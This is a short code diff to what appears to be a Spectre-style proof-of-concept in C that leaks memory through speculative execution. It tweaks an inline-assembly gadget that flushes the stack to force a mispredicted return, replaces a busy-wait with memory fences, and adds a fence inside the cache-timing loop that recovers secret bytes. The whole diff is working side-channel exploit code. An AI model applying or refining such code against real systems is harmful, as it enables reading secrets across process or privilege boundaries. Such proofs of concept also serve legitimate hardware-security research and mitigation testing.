@@ -41,7 +41,7 @@ void spectreGadget()
         "mov        %rbp,%rsp   \n"
         "pop        %rbp        \n"
         "clflush    (%rsp)      \n"     /* flushing creates a large speculative window */
-        "leaveq                 \n"
+        "leaveq                 \n"     /* pops the old frame pointer and thus restores the caller's frame */
         "retq                   \n"     /* triggers speculative return to s = *ptr */
     );
 }
@@ -53,7 +53,7 @@ void spectreAttack(char *ptr)
     for (i = 0; i < 256; i++) {
         _mm_clflush(&array[i * 512]);
     }
-    for (i = 0; i < 100; i++) { }
+    _mm_mfence();
 
     /* modifies the software stack */
     spectreGadget();
@@ -76,6 +76,7 @@ void readMemoryByte(char *ptr, uint8_t value[2], int score[2], uint64_t cache_hi
 
     for (attempts = 999; attempts > 0; attempts--) {
         spectreAttack(ptr);
+        _mm_mfence();
         /* real return value is obtained and the misspeculation is squashed */
         for (i = 0; i < 256; i++) {
             mix_i = ((i * 167) + 13) & 255;
